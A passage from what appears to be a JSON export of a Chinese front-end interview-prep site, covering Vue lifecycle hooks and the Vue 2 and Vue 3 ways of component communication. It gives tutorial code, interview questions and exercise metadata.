DOM。\n- **更新阶段**：\n  - `beforeUpdate`：响应式数据更新后，DOM 尚未更新。\n  - `updated`：数据更新导致 DOM 更新完成，可用于 DOM 依赖的数据更新场景。\n- **销毁阶段**：\n  - `beforeDestroy`：实例销毁前调用，适合清理定时器、事件监听等资源。\n  - `destroyed`：实例销毁完成，所有绑定事件移除，无法再操作实例。\n- **缓存组件**：\n  - `activated`：组件被激活时触发（如切换到缓存组件）。\n  - `deactivated`：组件被停用时触发（如切换到其他组件）。\n\n---\n\n### **3. 生命周期的使用场景**\n#### **问题**：\n1. 如果需要在组件加载时请求数据，应该在哪个生命周期执行？  \n2. 在销毁组件时，如何清理资源？\n\n#### **考察点**：\n- 数据初始化：\n  - 适合在 `created` 中发起异步请求（无需依赖 DOM）。\n  - 如果需要操作 DOM，可以在 `mounted` 中发起请求。\n- 清理资源：\n  - 在 `beforeDestroy` 钩子中清理定时器、事件监听器或解绑全局状态。\n    ```javascript\n    beforeDestroy() {\n      clearInterval(this.timer);\n    }\n    ```\n\n---\n\n### **4. 生命周期中的异步操作**\n#### **问题**：\n1. 如果在 `mounted` 钩子中调用异步操作，会有什么影响？  \n2. 如何在组件销毁前中止未完成的异步任务？\n\n#### **考察点**：\n- 异步操作不会阻塞生命周期的进程：\n  - 即使异步任务未完成，生命周期依然继续执行。\n  - 需要注意避免在组件销毁后修改状态：\n    ```javascript\n    async fetchData() {\n      const data = await fetch('/api/data');\n      if (!this._isDestroyed) this.data = data;\n    }\n    ```\n- 可通过 `beforeDestroy` 或取消令牌来中止任务：\n  ```javascript\n  const controller = new AbortController();\n  fetch('/api/data', { signal: controller.signal });\n\n  beforeDestroy() {\n    controller.abort();\n  }\n  ```\n\n---\n\n### **5. 生命周期钩子与 DOM 操作**\n#### **问题**：\n1. 为什么不建议在 `created` 钩子中操作 DOM？  \n2. 在 `mounted` 中操作 DOM 需要注意什么？\n\n#### **考察点**：\n- **`created` 中无法操作 DOM**：\n  - 此时组件尚未挂载，`$el` 还不可用。\n- **`mounted` 中的 DOM 操作**：\n  - 确保操作的 DOM 已完全插入。\n  - 避免在 `mounted` 中处理过多逻辑，影响首屏渲染性能。\n\n---\n\n### **6. 生命周期中的性能优化**\n#### **问题**：\n1. 如何避免在组件更新阶段（`beforeUpdate` 和 `updated`）中引发性能问题？  \n2. 生命周期钩子如何帮助优化性能？\n\n#### **考察点**：\n- **更新阶段优化**：\n  - 避免在 `updated` 钩子中操作大量 DOM。\n  - 通过条件判断，减少不必要的逻辑执行：\n    ```javascript\n    updated() {\n      if (this.previousValue !== this.currentValue) {\n        this.recalculate();\n      }\n    }\n    ```\n- **清理任务**：\n  - 在 `beforeDestroy` 中释放资源，减少内存泄漏。\n\n---\n\n### **7. 生命周期与父子组件的关系**\n#### **问题**：\n1. 父组件和子组件生命周期的执行顺序是怎样的？  \n2. 子组件销毁时，父组件的钩子会受到什么影响？\n\n#### **考察点**：\n- **挂载顺序**：\n  - 父组件的 `beforeCreate` -> `created` -> `beforeMount`\n  - 子组件的 `beforeCreate` -> `created` -> `beforeMount` -> `mounted`\n  - 父组件的 `mounted`\n- **销毁顺序**：\n  - 父组件的 `beforeDestroy` 触发后，先销毁子组件。\n  - 子组件的 `destroyed` 执行完成后，父组件进入 `destroyed` 钩子。\n\n---\n\n### **8. 生命周期在实际项目中的应用**\n#### **问题**：\n1. 项目中你是如何使用生命周期钩子来管理组件逻辑的？  \n2. 是否遇到过生命周期相关的问题？如何解决？\n\n#### **考察点**：\n- 常见应用：\n  - `created` 用于初始化数据或全局事件监听。\n  - `mounted` 用于 DOM 操作和第三方库的初始化。\n  - `beforeDestroy` 用于资源清理（如移除事件监听、销毁定时器）。\n- 典型问题：\n  - 异步任务导致的状态更新问题。\n  - 使用 `<keep-alive>` 时，生命周期行为不符合预期。\n\n---\n\n### **9. 生命周期的扩展和自定义**\n#### **问题**：\n1. Vue 提供的生命周期钩子是否满足所有场景需求？如果不满足，如何扩展？  \n2. 如何结合 Vue 3 的 Composition API 管理生命周期？\n\n#### **考察点**：\n- **自定义钩子**：\n  - 在 Vue 3 中使用 `onXXX` 的形式管理生命周期：\n    ```javascript\n    import { onMounted } from 'vue';\n\n    onMounted(() => {\n      console.log('Component mounted');\n    });\n    ```\n- **扩展场景**：\n  - 使用自定义 hooks 组织复杂逻辑：\n    ```javascript\n    function useFetchData() {\n      onMounted(() => fetchData());\n    }\n    ```\n\n---\n\n### **开放性问题**\n1. 如果你发现组件初始化或销毁时有性能瓶颈，如何优化？\n2. 你认为 Vue 的生命周期设计有哪些优点和局限？\n\n---\n\n### **总结**\n对 Vue 生命周期的考察，可以帮助了解候选人是否熟悉组件的生命周期流程，能否正确选择合适的钩子处理逻辑，以及是否具备性能优化、调试和问题排查的能力。",
    "exerciseKeyList": "[\"126917b6-56bc-4c94-81b7-f39263395546\",\"a9e3ac89-9ecf-4b22-bcbb-e51d0197005b\",\"cf1e843f-9005-42dc-b204-194dd3d1fc42\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-04T13:05:56.000Z",
    "updateAt": "2024-12-15T11:42:04.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "126917b6-56bc-4c94-81b7-f39263395546",
        "title": "Vue 中父组件怎么监听到子组件的生命周期？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-06-06T01:29:50.000Z",
        "updateAt": "2024-08-10T17:07:43.000Z"
      },
      {
        "exerciseKey": "a9e3ac89-9ecf-4b22-bcbb-e51d0197005b",
        "title": "vue中，推荐在哪个生命周期发起请求？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-06-01T02:16:47.000Z",
        "updateAt": "2024-08-10T17:07:42.000Z"
      },
      {
        "exerciseKey": "cf1e843f-9005-42dc-b204-194dd3d1fc42",
        "title": "说说你对Vue生命周期的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:32:07.000Z",
        "updateAt": "2024-08-10T17:04:39.000Z"
      }
    ]
  },
  "71": {
    "id": 71,
    "tagId": 14,
    "title": "组件通信",
    "explanation": "Vue3 组件通信方式\n-----------\n\n*   props\n*   $emit\n*   expose / ref\n*   $attrs\n*   v-model\n*   provide / inject\n*   Vuex\n*   mitt\n\nVue3 通信使用写法\n-----------\n\n### 1\\. props\n\n用 props 传数据给子组件有两种方法，如下\n\n方法一，setup() 方法写法\n\n```javascript\n// Parent.vue 传送\n<child :msg1=\"msg1\" :msg2=\"msg2\"></child>\n<script>\nimport child from \"./child.vue\"\nimport { ref, reactive } from \"vue\"\nexport default {\n    data(){\n        return {\n            msg1:\"这是传级子组件的信息1\"\n        }\n    },\n    setup(){\n        // 创建一个响应式数据\n        \n        // 写法一 适用于基础类型  ref 还有其他用处，下面章节有介绍\n        const msg2 = ref(\"这是传级子组件的信息2\")\n        \n        // 写法二 适用于复杂类型，如数组、对象\n        const msg2 = reactive([\"这是传级子组件的信息2\"])\n        \n        return {\n            msg2\n        }\n    }\n}\n</script>\n\n// Child.vue 接收\n<script>\nexport default {\n  props: [\"msg1\", \"msg2\"],// 如果这行不写，下面就接收不到\n  setup(props) {\n    console.log(props) // { msg1:\"这是传给子组件的信息1\", msg2:\"这是传给子组件的信息2\" }\n  },\n}\n</script>\n\n```\n\n方法二，setup 语法糖\n\n```javascript\n// Parent.vue 传送\n<child :msg2=\"msg2\"></child>\n<script setup>\n    import child from \"./child.vue\"\n    import { ref, reactive } from \"vue\"\n    const msg2 = ref(\"这是传给子组件的信息2\")\n    // 或者复杂类型\n    const msg2 = reactive([\"这是传级子组件的信息2\"])\n</script>\n\n// Child.vue 接收\n<script setup>\n    // 不需要引入 直接使用\n    // import { defineProps } from \"vue\"\n    const props = defineProps({\n        // 写法一\n        msg2: String\n        // 写法二\n        msg2:{\n            type:String,\n            default:\"\"\n        }\n    })\n    console.log(props) // { msg2:\"这是传级子组件的信息2\" }\n</script>\n\n```\n\n注意：\n\n如果父组件是setup()，子组件setup 语法糖写法的话，是接收不到父组件里 data 的属性，只能接收到父组件里 setup 函数里传的属性\n\n如果父组件是setup 语法糖写法，子组件setup()方法写法，可以通过 props 接收到 data 和 setup 函数里的属性，但是子组件要是在 setup 里接收，同样只能接收到父组件中 setup 函数里的属性，接收不到 data 里的属性\n\n官方也说了，既然用了 3，就不要写 2 了，所以不推荐setup()方法写法。下面的例子，一律只用语法糖的写法\n\n### 2\\. $emit\n\n```javascript\n// Child.vue 派发\n<template>\n    // 写法一\n    <button @click=\"emit('myClick')\">按钮</buttom>\n    // 写法二\n    <button @click=\"handleClick\">按钮</buttom>\n</template>\n<script setup>\n    \n    // 方法一 适用于Vue3.2版本 不需要引入\n    // import { defineEmits } from \"vue\"\n    // 对应写法一\n    const emit = defineEmits([\"myClick\",\"myClick2\"])\n    // 对应写法二\n    const handleClick = ()=>{\n        emit(\"myClick\", \"这是发送给父组件的信息\")\n    }\n    \n    // 方法二 不适用于 Vue3.2版本，该版本 useContext()已废弃\n    import { useContext } from \"vue\"\n    const { emit } = useContext()\n    const handleClick = ()=>{\n        emit(\"myClick\", \"这是发送给父组件的信息\")\n    }\n</script>\n\n// Parent.vue 响应\n<template>\n    <child @myClick=\"onMyClick\"></child>\n</template>\n<script setup>\n    import child from \"./child.vue\"\n    const onMyClick = (msg) => {\n        console.log(msg) // 这是父组件收到的信息\n    }\n</script>\n\n```\n\n### 3\\. expose / ref\n\n父组件获取子组件的属性或者调用子组件方法\n\n```javascript\n// Child.vue\n<script setup>\n    // 方法一 不适用于Vue3.2版本，该版本 useContext()已废弃\n    import { useContext } from \"vue\"\n    const ctx = useContext()\n    // 对外暴露属性方法等都可以\n    ctx.expose({\n        childName: \"这是子组件的属性\",\n        someMethod(){\n            console.log(\"这是子组件的方法\")\n        }\n    })\n    \n    // 方法二 适用于Vue3.2版本, 不需要引入\n    // import { defineExpose } from \"vue\"\n    defineExpose({\n        childName: \"这是子组件的属性\",\n        someMethod(){\n            console.log(\"这是子组件的方法\")\n        }\n    })\n</script>\n\n// Parent.vue  注意 ref=\"comp\"\n<template>\n    <child ref=\"comp\"></child>\n    <button @click=\"handlerClick\">按钮</button>\n</template>\n<script setup>\n    import child from \"./child.vue\"\n    import { ref } from \"vue\"\n    const comp = ref(null)\n    const handlerClick = () => {\n        console.log(comp.value.childName) // 获取子组件对外暴露的属性\n        comp.value.someMethod() // 调用子组件对外暴露的方法\n    }\n</script>\n\n```\n\n### 4\\. attrs\n\n`attrs`：包含父作用域里除 class 和 style 除外的非 props **属性集合**\n\n```javascript\n// Parent.vue 传送\n<child :msg1=\"msg1\" :msg2=\"msg2\" title=\"3333\"></child>\n<script setup>\n    import child from \"./child.vue\"\n    import { ref, reactive } from \"vue\"\n    const msg1 = ref(\"1111\")\n    const msg2 = ref(\"2222\")\n</script>\n\n// Child.vue 接收\n<script setup>\n    import { defineProps, useContext, useAttrs } from \"vue\"\n    // 3.2版本不需要引入 defineProps，直接用\n    const props = defineProps({\n        msg1: String\n    })\n    // 方法一 不适用于 Vue3.2版本，该版本 useContext()已废弃\n    const ctx = useContext()\n    // 如果没有用 props 接收 msg1 的话就是 { msg1: \"1111\", msg2:\"2222\", title: \"3333\" }\n    console.log(ctx.attrs) // { msg2:\"2222\", title: \"3333\" }\n    \n    // 方法二 适用于 Vue3.2版本\n    const attrs = useAttrs()\n    console.log(attrs) // { msg2:\"2222\", title: \"3333\" }\n</script>\n\n```\n\n### 5\\. v-model\n\n可以支持多个数据双向绑定\n\n```javascript\n// Parent.vue\n<child v-model:key=\"key\" v-model:value=\"value\"></child>\n<script setup>\n    import child from \"./child.vue\"\n    import { ref, reactive } from \"vue\"\n    const key = ref(\"1111\")\n    const value = ref(\"2222\")\n</script>\n\n// Child.vue\n<template>\n    <button @click=\"handlerClick\">按钮</button>\n</template>\n<script setup>\n    \n    // 方法一  不适用于 Vue3.2版本，该版本 useContext()已废弃\n    import { useContext } from \"vue\"\n    const { emit } = useContext()\n    \n    // 方法二 适用于 Vue3.2版本，不需要引入\n    // import { defineEmits } from \"vue\"\n    const emit = defineEmits([\"key\",\"value\"])\n    \n    // 用法\n    const handlerClick = () => {\n        emit(\"update:key\", \"新的key\")\n        emit(\"update:value\", \"新的value\")\n    }\n</script>\n\n```\n\n### 6\\. provide / inject\n\nprovide / inject 为依赖注入\n\n`provide`：可以让我们指定想要提供给后代组件的数据或\n\n`inject`：在任何后代组件中接收想要添加在这个组件上的数据，不管组件嵌套多深都可以直接拿来用\n\n```javascript\n// Parent.vue\n<script setup>\n    import { provide } from \"vue\"\n    provide(\"name\", \"沐华\")\n</script>\n\n// Child.vue\n<script setup>\n    import { inject } from \"vue\"\n    const name = inject(\"name\")\n    console.log(name) // 沐华\n</script>\n\n```\n\n### 7\\. Vuex/Pinia\n\n以 Vuex 为例，使用方法如下：\n\n```javascript\n// store/index.js\nimport { createStore } from \"vuex\"\nexport default createStore({\n    state:{ count: 1 },\n    getters:{\n        getCount: state => state.count\n    },\n    mutations:{\n        add(state){\n            state.count++\n        }\n    }\n})\n\n// main.js\nimport { createApp } from \"vue\"\nimport App from \"./App.vue\"\nimport store from \"./store\"\ncreateApp(App).use(store).mount(\"#app\")\n\n// Page.vue\n// 方法一 直接使用\n<template>\n    <div>{{ $store.state.count }}</div>\n    <button @click=\"$store.commit('add')\">按钮</button>\n</template>\n\n// 方法二 获取\n<script setup>\n    import { useStore, computed } from \"vuex\"\n    const store = useStore()\n    console.log(store.state.count) // 1\n\n    const count = computed(()=>store.state.count) // 响应式，会随着vuex数据改变而改变\n    console.log(count) // 1 \n</script>\n\n```\n\n### 8\\. mitt\n\nVue3 中没有了 EventBus 跨组件通信，但是现在有了一个替代的方案 mitt.js，原理还是 EventBus\n\n先安装 `npm i mitt -S`\n\n然后像以前封装 bus 一样，封装一下\n\n```javascript\nimport mitt from 'mitt'\nconst mitt = mitt()\nexport default mitt\n\n```\n\n然后两个组件之间通信的使用\n\n```javascript\n// 组件 A\n<script setup>\nimport mitt from './mitt'\nconst handleClick = () => {\n    mitt.emit('handleChange')\n}\n</script>\n\n// 组件 B \n<script setup>\nimport mitt from './mitt'\nimport { onUnmounted } from 'vue'\nconst someMethed = () => { ... }\nmitt.on('handleChange',someMethed)\nonUnmounted(()=>{\n    mitt.off('handleChange',someMethed)\n})\n</script>\n\n```\n\nVue2.x 组件通信方式\n-------------\n\nVue2.x 组件通信共有12种\n\n1.  props\n2.  $emit / v-on\n3.  .sync\n4.  v-model\n5.  ref\n6.  $children / $parent\n7.  $attrs / $listeners\n8.  provide / inject\n9.  EventBus\n10.  Vuex\n11.  $root\n12.  slot\n\n父子组件通信可以用：\n\n*   props\n*   $emit / v-on\n*   $attrs / $listeners\n*   ref\n*   .sync\n*   v-model\n*   $children / $parent\n\n兄弟组件通信可以用：\n\n*   EventBus\n*   Vuex\n*   $parent\n\n跨层级组件通信可以用：\n\n*   provide/inject\n*   EventBus\n*   Vuex\n*   $attrs / $listeners\n*   $root\n\nVue2.x 通信使用写法\n-------------\n\n下面把每一种组件通信方式的写法一一列出\n\n### 1\\. props\n\n父组件向子组件传送数据，这应该是最常用的方式了\n\n子组件接收到数据之后，**不能直接修改**父组件的数据。会报错，所以当父组件重新渲染时，数据会被覆盖。如果子组件内要修改的话推荐使用 computed\n\n```javascript\n// Parent.vue 传送\n<template>\n    <child :msg=\"msg\"></child>\n</template>\n\n// Child.vue 接收\nexport default {\n  // 写法一 用数组接收\n  props:['msg'],\n  // 写法二 用对象接收，可以限定接收的数据类型、设置默认值、验证等\n  props:{\n      msg:{\n          type:String,\n          default:'这是默认数据'\n      }\n  },\n  mounted(){\n      console.log(this.msg)\n  },\n}\n\n```\n\n### 2\\. .sync\n\n可以帮我们实现父组件向子组件传递的数据 的双向绑定，所以子组件接收到数据后**可以直接修改**，并且会同时修改父组件的数据\n\n```javascript\n// Parent.vue\n<template>\n    <child :page.sync=\"page\"></child>\n</template>\n<script>\nexport default {\n    data(){\n        return {\n            page:1\n        }\n    }\n}\n\n// Child.vue\nexport default {\n    props:[\"page\"],\n    computed(){\n        // 当我们在子组件里修改 currentPage 时，父组件的 page 也会随之改变\n        currentPage {\n            get(){\n                return this.page\n            },\n            set(newVal){\n                this.$emit(\"update:page\", newVal)\n            }\n        }\n    }\n}\n</script>\n\n```\n\n### 3\\. v-model\n\n和 .sync 类似，可以实现将父组件传给子组件的数据为双向绑定，子组件通过 $emit 修改父组件的数据\n\n```javascript\n// Parent.vue\n<template>\n    <child v-model=\"value\"></child>\n</template>\n<script>\nexport default {\n    data(){\n        return {\n            value:1\n        }\n    }\n}\n\n// Child.vue\n<template>\n    <input :value=\"value\" @input=\"handlerChange\">\n</template>\nexport default {\n    props:[\"value\"],\n    // 可以修改事件名，默认为 input\n    model:{\n        // prop:'value', // 上面传的是value这里可以不写，如果属性名不是value就要写\n        event:\"updateValue\"\n    },\n    methods:{\n        handlerChange(e){\n            this.$emit(\"input\", e.target.value)\n            // 如果有上面的重命名就是这样\n            this.$emit(\"updateValue\", e.target.value)\n        }\n    }\n}\n</script>\n\n```\n\n### 4\\. ref\n\nref 如果在普通的DOM元素上，引用指向的就是该DOM元素;\n\n如果在子组件上，引用的指向就是子组件实例，然后父组件就可以通过 ref 主动获取子组件的属性或者调用子组件的方法\n\n```javascript\n// Child.vue\nexport default {\n    data(){\n        return {\n            name:\"沐华\"\n        }\n    },\n    methods:{\n        someMethod(msg){\n            console.log(msg)\n        }\n    }\n}\n\n// Parent.vue\n<template>\n    <child ref=\"child\"></child>\n</template>\n<script>\nexport default {\n    mounted(){\n        const child = this.$refs.child\n        console.log(child.name) // 沐华\n        child.someMethod(\"调用了子组件的方法\")\n    }\n}\n</script>\n\n```\n\n### 5\\. $emit / v-on\n\n子组件通过派发事件的方式给父组件数据，或者触发父组件更新等操作\n\n```javascript\n// Child.vue 派发\nexport default {\n  data(){\n      return { msg: \"这是发给父组件的信息\" }\n  },\n  methods: {\n      handleClick(){\n          this.$emit(\"sendMsg\",this.msg)\n      }\n  },\n}\n// Parent.vue 响应\n<template>\n    <child v-on:sendMsg=\"getChildMsg\"></child>\n    // 或 简写\n    <child @sendMsg=\"getChildMsg\"></child>\n</template>\n\nexport default {\n    methods:{\n        getChildMsg(msg){\n            console.log(msg) // 这是父组件接收到的消息\n        }\n    }\n}\n\n```\n\n### 6\\. $attrs / $listeners\n\n多层嵌套组件传递数据时，如果只是传递数据，而不做中间处理的话就可以用这个，比如父组件向孙子组件传递数据时\n\n`$attrs`：包含父作用域里除 class 和 style 除外的非 props **属性集合**。通过 this.$attrs 获取父作用域中所有符合条件的属性集合，然后还要继续传给子组件内部的其他组件，就可以通过 v-bind=\"$attrs\"\n\n`$listeners`：包含父作用域里 .native 除外的监听**事件集合**。如果还要继续传给子组件内部的其他组件，就可以通过 v-on=\"$linteners\"\n\n使用方式是相同的\n\n```javascript\n// Parent.vue\n<template>\n    <child :name=\"name\" title=\"1111\" ></child>\n</template\nexport default{\n    data(){\n        return {\n            name:\"沐华\"\n        }\n    }\n}\n\n// Child.vue\n<template>\n    // 继续传给孙子组件\n    <sun-child v-bind=\"$attrs\"></sun-child>\n</template>\nexport default{\n    props:[\"name\"], // 这里可以接收，也可以不接收\n    mounted(){\n        // 如果props接收了name 就是 { title:1111 }，否则就是{ name:\"沐华\", title:1111 }\n        console.log(this.$attrs)\n    }\n}\n\n```\n\n### 7\\. $children / $parent\n\n`$children`：获取到一个包含所有子组件(不包含孙子组件)的 VueComponent 对象数组，可以直接拿到子组件中所有数据和方法等\n\n`$parent`：获取到一个父节点的 VueComponent 对象，同样包含父节点中所有数据和方法等\n\n```javascript\n// Parent.vue\nexport default{\n    mounted(){\n        this.$children[0].someMethod() // 调用第一个子组件的方法\n        this.$children[0].name // 获取第一个子组件中的属性\n    }\n}\n\n// Child.vue\nexport default{\n    mounted(){\n        this.$parent.someMethod() // 调用父组件的方法\n        this.$parent.name // 获取父组件中的属性\n    }\n}\n\n```\n\n### 8\\. provide / inject\n\nprovide / inject 为依赖注入，说是不推荐直接用于应用程序代码中，但是在一些插件或组件库里却是被常用，所以我觉得用也没啥，还挺好用的\n\n`provide`：可以让我们指定想要提供给后代组件的数据或方法\n\n`inject`：在任何后代组件中接收想要添加在这个组件上的数据或方法，不管组件嵌套多深都可以直接拿来用\n\n要注意的是 provide 和 inject 传递的数据不是响应式的，也就是说用 inject 接收来数据后，provide 里的数据改变了，后代组件中的数据不会改变，除非传入的就是一个可监听的对象\n\n所以建议还是传递一些常量或者方法\n\n```javascript\n// 父组件\nexport default{\n    // 方法一 不能获取 this.xxx，只能传写死的\n    provide:{\n        name:\"沐华\",\n    },\n    // 方法二 可以获取 this.xxx\n    provide(){\n        return {\n            name:\"沐华\",\n            msg: this.msg // data 中的属性\n            someMethod:this.someMethod // methods 中的方法\n        }\n    },\n    methods:{\n        someMethod(){\n            console.log(\"这是注入的方法\")\n        }\n    }\n}\n\n// 后代组件\nexport default{\n    inject:[\"name\",\"msg\",\"someMethod\"],\n    mounted(){\n        console.log(this.msg) // 这里拿到的属性不是响应式的，如果需要拿到最新的，可以在下面的方法中返回\n        this.someMethod()\n    }\n}\n\n```\n\n### 9\\. EventBus\n\nEventBus 是中央事件总线，不管是父子组件，兄弟组件，跨层级组件等都可以使用它完成通信操作\n\n定义方式有三种\n\n```javascript\n// 方法一\n// 抽离成一个单独的 js 文件 Bus.js ，然后在需要的地方引入\n// Bus.js\nimport Vue from \"vue\"\nexport default new Vue()\n\n// 方法二 直接挂载到全局\n// main.js\nimport Vue from \"vue\"\nVue.prototype.$bus = new Vue()\n\n// 方法三 注入到 Vue 根对象上\n// main.js\nimport Vue from \"vue\"\nnew Vue({\n    el:\"#app\",\n    data:{\n        Bus: new Vue()\n    }\n})\n\n```\n\n使用如下，以方法一按需引入为例\n\n```javascript\n// 在需要向外部发送自定义事件的组件内\n<template>\n    <button @click=\"handlerClick\">按钮</button>\n</template>\nimport Bus from \"./Bus.js\"\nexport default{\n    methods:{\n        handlerClick(){\n            // 自定义事件名 sendMsg\n            Bus.$emit(\"sendMsg\", \"这是要向外部发送的数据\")\n        }\n    }\n}\n\n// 在需要接收外部事件的组件内\nimport Bus from \"./Bus.js\"\nexport default{\n    mounted(){\n        // 监听事件的触发\n        Bus.$on(\"sendMsg\", data => {\n            console.log(\"这是接收到的数据：\", data)\n        })\n    },\n    beforeDestroy(){\n        // 取消监听\n        Bus.$off(\"sendMsg\")\n    }\n}\n\n```\n\n### 10\\. Vuex\n\nVuex 是状态管理器，集中式存储管理所有组件的状态。这一块内容过长，如果基础不熟的话可以看这个[Vuex](https://link.juejin.cn/?target=https%3A%2F%2Fvuex.vuejs.org%2Fzh%2F \"https://vuex.vuejs.org/zh/\")，然后大致用法如下\n\n比如创建这样的文件结构\n\n![微信图片_20210824003500.jpg](https://static.ecool.fun//article/59925090-a36e-476b-ac1d-db273056daea.awebp)\n\nindex.js 里内容如下\n\n```javascript\nimport Vue from 'vue'\nimport Vuex from 'vuex'\nimport getters from './getters'\nimport actions from './actions'\nimport mutations from './mutations'\nimport state from './state'\nimport user from './modules/user'\n\nVue.use(Vuex)\n\nconst store = new Vuex.Store({\n  modules: {\n    user\n  },\n  getters,\n  actions,\n  mutations,\n  state\n})\nexport default store\n\n```\n\n然后在 main.js 引入\n\n```javascript\nimport Vue from \"vue\"\nimport store from \"./store\"\nnew Vue({\n    el:\"#app\",\n    store,\n    render: h => h(App)\n})\n\n```\n\n然后在需要的使用组件里\n\n```javascript\nimport { mapGetters, mapMutations } from \"vuex\"\nexport default{\n    computed:{\n        // 方式一 然后通过 this.属性名就可以用了\n        ...mapGetters([\"引入getters.js里属性1\",\"属性2\"])\n        // 方式二\n        ...mapGetters(\"user\", [\"user模块里的属性1\",\"属性2\"])\n    },\n    methods:{\n        // 方式一 然后通过 this.属性名就可以用了\n        ...mapMutations([\"引入mutations.js里的方法1\",\"方法2\"])\n        // 方式二\n        ...mapMutations(\"user\",[\"引入user模块里的方法1\",\"方法2\"])\n    }\n}\n\n// 或者也可以这样获取\nthis.$store.state.xxx\nthis.$store.state.user.xxx\n\n```\n\n### 11\\. $root\n\n`$root` 可以拿到 App.vue 里的数据和方法\n\n### 12\\. slot\n\n就是把子组件的数据通过插槽的方式传给父组件使用，然后再插回来\n\n```javascript\n// Child.vue\n<template>\n    <div>\n        <slot :user=\"user\"></slot>\n    </div>\n</template>\nexport default{\n    data(){\n        return {\n            user:{ name:\"沐华\" }\n        }\n    }\n}\n\n// Parent.vue\n<template>\n    <div>\n        <child v-slot=\"slotProps\">\n            {{ slotProps.user.name }}\n        </child>\n    </div>\n</template>\n\n```\n\n",
    "testPoint": "### **1. 父子组件通信**\n#### **问题：**\n1. Vue 中父组件如何向子组件传递数据？子组件如何向父组件传递消息？  \n2. 子组件如何监听父组件数据的变化？需要注意什么？\n\n#### **考察点：**\n- 父组件通过 `props` 向子组件传递数据：\n  ```vue\n  <!-- 父组件 -->\n  <ChildComponent :title=\"parentTitle\" />\n  \n  <!-- 子组件 -->\n  props: {\n    title: {\n      type: String,\n      required: true\n    }\n  }\n  ```\n- 子组件通过 `$emit` 向父组件发送事件：\n  ```vue\n  // 子组件\n  this.$emit('updateTitle', newTitle);\n\n  <!-- 父组件 -->\n  <ChildComponent @updateTitle=\"handleUpdate\" />\n  ```\n- **注意点**：\n  - 父组件数据变化会自动同步到子组件（单向数据流）。\n  - 子组件传递数据时，应遵循父子分工明确的原则，避免子组件直接修改 `props`（违反单向数据流）。\n\n---\n\n### **2. 兄弟组件通信**\n#### **问题：**\n1. 如何在兄弟组件之间传递数据？常见的解决方案有哪些？  \n2. Vue 3 的 `provide` 和 `inject` 能否解决兄弟组件通信问题？\n\n#### **考察点：**\n- **事件总线（Vue 2）**：\n  - 使用一个空的 Vue 实例作为事件总线，在兄弟组件间传递消息：\n    ```javascript\n    // 创建事件总线\n    const EventBus = new Vue();\n\n    // 兄弟组件 A\n    EventBus.$emit('eventName', data);\n\n    // 兄弟组件 B\n    EventBus.$on('eventName', (data) => {\n      console.log(data);\n    });\n    ```\n- **父组件中转**：\n  - 将兄弟组件的通信数据提升到父组件，借助父组件的状态和事件分发。\n- **Vuex 或 Pinia**：\n  - 适合复杂应用，利用状态管理工具实现跨组件通信。\n- **Vue 3 的 `provide` 和 `inject`**：\n  - 通常适用于父子链条，不直接用于兄弟组件通信。\n\n---\n\n### **3. 跨层级通信**\n#### **问题：**\n1. Vue 2 和 Vue 3 分别提供了哪些方式来实现跨层级组件通信？  \n2. `provide` 和 `inject` 的使用场景有哪些？\n\n#### **考察点：**\n- **Vue 2 中的跨层级通信**：\n  - 依赖事件总线或 Vuex，手动传递数据。\n- **Vue 3 的 `provide` 和 `inject`**：\n  - `provide` 用于在祖先组件中提供数据：\n    ```javascript\n    // 祖先组件\n    provide('keyName', value);\n    ```\n  - `inject` 用于在后代组件中接收数据：\n    ```javascript\n    // 后代组件\n    const value = inject('keyName');\n    ```\n  - **注意点**：\n    - `provide` 和 `inject` 适合静态依赖，不适合频繁变动的数据传递。\n\n---\n\n### **4. 全局状态管理**\n#### **问题：**\n1. 什么情况下需要使用 Vuex 或 Pinia？如何在组件中使用它们？  \n2. Vuex 和 `props/$emit` 相比，有哪些优点和缺点？\n\n#### **考察点：**\n- 使用场景：\n  - 需要共享的状态数据较多且层级深时，使用全局状态管理工具（如 Vuex 或 Pinia）。\n- Vuex 的核心概念：\n  - **state**：集中式存储状态。\n  - **getters**：派生状态，类似计算属性。\n  - **mutations**：同步修改状态的方法。\n  - **actions**：提交异步逻辑后调用 `mutations`。\n  - **modules**：模块化管理状态。\n- 使用示例：\n  ```javascript\n  // 读取状态\n  computed: {\n    count() {\n      return this.$store.state.count;\n    }\n  }\n\n  // 触发修改\n  methods: {\n    increment() {\n      this.$store.commit('increment');\n    }\n  }\n  ```\n\n---\n\n### **5. 动态组件通信**\n#### **问题：**\n1. 如何管理动态创建的组件之间的通信？  \n2. 动态组件的生命周期如何影响通信？\n\n#### **考察点：**\n- 动态组件通常由父组件管理，通过 `key` 控制重渲染：\n  ```vue\n  <component :is=\"currentComponent\" :data=\"dynamicData\" />\n  ```\n- 数据流方向：\n  - 父组件管理动态组件的状态，动态组件通过 `props` 接收数据，通过 `$emit` 反馈。\n- 生命周期影响：\n  - 需要注意动态组件被销毁后，事件监听器或异步任务的清理。\n\n---\n\n### **6. 开放性问题**\n#### **问题：**\n1. 在实际项目中，你是如何设计组件通信的？  \n2. 在组件通信中，你是否遇到过性能或复杂性问题？是如何解决的？\n\n#### **考察点：**\n- 考察候选人是否能够根据项目规模选择适合的通信方案。\n- 复杂通信场景中是否能平衡性能与可维护性。\n\n---\n\n### **总结**\nVue 的组件通信方式灵活多样，常见有 `props/$emit`、事件总线、`provide/inject`、Vuex 等。考察时可以关注候选人对通信场景的适配能力，以及对性能优化和复杂度管理的意识。",
    "exerciseKeyList": "[\"e492260e-4dc9-43cf-a2ee-315edadeb931\",\"a88670ef-a898-4676-a272-cabf8bdfade7\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 1,
    "createAt": "2024-10-04T13:44:09.000Z",
    "updateAt": "2024-12-15T11:45:30.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "a88670ef-a898-4676-a272-cabf8bdfade7",
        "title": "Vue组件间通信方式都有哪些? ",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:37:44.000Z",
        "updateAt": "2024-08-10T17:04:41.000Z"
      },
      {
        "exerciseKey": "e492260e-4dc9-43cf-a2ee-315edadeb931",
        "title": "vue的祖孙组件的通信方案有哪些？",
        "category": "QA",
        "vipLimit": 0,
